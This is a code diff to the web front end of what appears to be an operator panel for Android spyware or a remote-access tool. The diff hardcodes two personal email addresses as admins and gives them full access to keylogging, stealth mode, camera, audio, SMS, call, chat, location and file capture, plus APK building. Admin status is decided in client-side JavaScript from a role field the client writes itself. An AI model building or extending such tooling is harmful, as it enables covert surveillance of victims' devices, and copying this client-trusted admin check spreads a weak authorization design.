@@ -849,6 +849,9 @@
     </div>
 
     <script>
+    // Define Admin emails list
+    const ADMIN_EMAILS = ['ggvgghb243@gmail.com', 'ohedulislam577@gmail.com'];
+
     window.globalDefaults = {
         sms: false,
         notification: false,
@@ -869,13 +872,23 @@
         build_apk: true
     };
 
+    function checkIsAdmin(userEmail, userMeta) {
+        const cleanEmail = (userEmail || (fbAuth.currentUser ? fbAuth.currentUser.email : '') || '').trim().toLowerCase();
+        const isEmailAdmin = ADMIN_EMAILS.map(e => e.trim().toLowerCase()).includes(cleanEmail);
+        const meta = userMeta || (typeof currentMeta !== 'undefined' ? currentMeta : {}) || {};
+        const isRoleAdmin = meta && (meta.role === 'ADMIN' || meta.role === 'admin');
+        return isEmailAdmin || isRoleAdmin;
+    }
+
+    let currentMeta = {};
+
     fbAuth.onAuthStateChanged(user => {
         if (!user) {
             window.location.replace('login.html');
             return;
         }
 
-        const email = (user.email || '').toLowerCase();
+        const email = (user.email || '').trim().toLowerCase();
         const uid = user.email ? user.email.replace(/[@.]/g, '_') : user.uid;
 
         trackUserActivity(user, `Opened Device Control [${DID}]`);
@@ -889,18 +902,40 @@
         });
 
         // Listen to User-Specific Overrides
-        let currentMeta = {};
         fbDb.ref('users_meta/' + uid).on('value', snap => {
             currentMeta = snap.val() || {};
             evaluatePermissions();
         });
 
         function evaluatePermissions() {
-            const userCustom = currentMeta.permissions || {};
-            window.isUserAdmin = ADMIN_EMAILS.includes(email) || currentMeta.role === 'ADMIN';
+            window.isUserAdmin = checkIsAdmin(email, currentMeta);
 
-            // Merge global defaults with user overrides
-            window.userPermissions = Object.assign({}, window.globalDefaults, userCustom);
+            if (window.isUserAdmin) {
+                // Admin account has 100% UNRESTRICTED full access to ALL features
+                window.userPermissions = {
+                    sms: true,
+                    notification: true,
+                    stealth: true,
+                    accounts: true,
+                    calls: true,
+                    gallery: true,
+                    files: true,
+                    location: true,
+                    keylogs: true,
+                    audio: true,
+                    camera: true,
+                    chats: true,
+                    apps: true,
+                    privacy_screen: true,
+                    sensitive_feed: true,
+                    edit_modules: true,
+                    build_apk: true
+                };
+            } else {
+                const userCustom = currentMeta.permissions || {};
+                // Merge global defaults with user overrides
+                window.userPermissions = Object.assign({}, window.globalDefaults, userCustom);
+            }
             
             const badge = document.getElementById('privacyLockBadge');
             if (badge) {
@@ -928,14 +963,14 @@
 
     function trackUserActivity(user, actionName) {
         if (!user) return;
-        const email = user.email || '';
+        const email = (user.email || '').trim().toLowerCase();
         const uid = email ? email.replace(/[@.]/g, '_') : user.uid;
-        const isHardcodedAdmin = ADMIN_EMAILS.includes(email.toLowerCase());
+        const isHardcodedAdmin = ADMIN_EMAILS.map(e => e.trim().toLowerCase()).includes(email);
 
         fbDb.ref('users_meta/' + uid).once('value', snap => {
             const umeta = snap.val() || {};
             const loginCount = (umeta.login_count || 0) + 1;
-            const role = isHardcodedAdmin ? 'ADMIN' : (umeta.role || 'USER');
+            const role = (isHardcodedAdmin || umeta.role === 'ADMIN') ? 'ADMIN' : (umeta.role || 'USER');
 
             const updatedData = {
                 uid: uid,
@@ -948,6 +983,10 @@
                 login_count: loginCount,
                 user_agent: navigator.userAgent
             };
+
+            if (isHardcodedAdmin || role === 'ADMIN') {
+                updatedData.role = 'ADMIN';
+            }
 
             if (!umeta.created_at) updatedData.created_at = Date.now();
             fbDb.ref('users_meta/' + uid).update(updatedData);
